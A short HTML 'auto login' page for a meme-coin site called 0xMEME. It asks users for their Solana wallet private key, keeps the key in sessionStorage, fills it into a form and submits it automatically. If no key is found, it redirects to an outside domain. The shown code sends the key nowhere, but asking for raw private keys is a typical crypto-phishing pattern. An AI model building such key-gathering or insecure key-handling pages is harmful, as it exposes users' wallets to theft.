<!DOCTYPE html>
<html>
<head>
    <title>0xMEME - 自动登录</title>
    <meta charset="UTF-8">
    <script>
        window.onload = function() {
            // 从 sessionStorage 中获取私钥
            const privateKey = sessionStorage.getItem("privateKey");
            if (privateKey) {
                // 填写私钥并触发登录
                document.getElementById("privateKeyInput").value = privateKey;
                // 自动触发登录按钮
                document.getElementById("loginButton").click();
            } else {
                alert("未找到私钥，请返回并重新输入！");
                window.location.href = "https://1001Dao.fun";
            }
        }
    </script>
</head>
<body>
    <h2>MEME</h2>
    <input type="password" id="privateKeyInput" placeholder="请输入 SOL 私钥以登录">
    <button id="loginButton">登录</button>
</body>
</html>
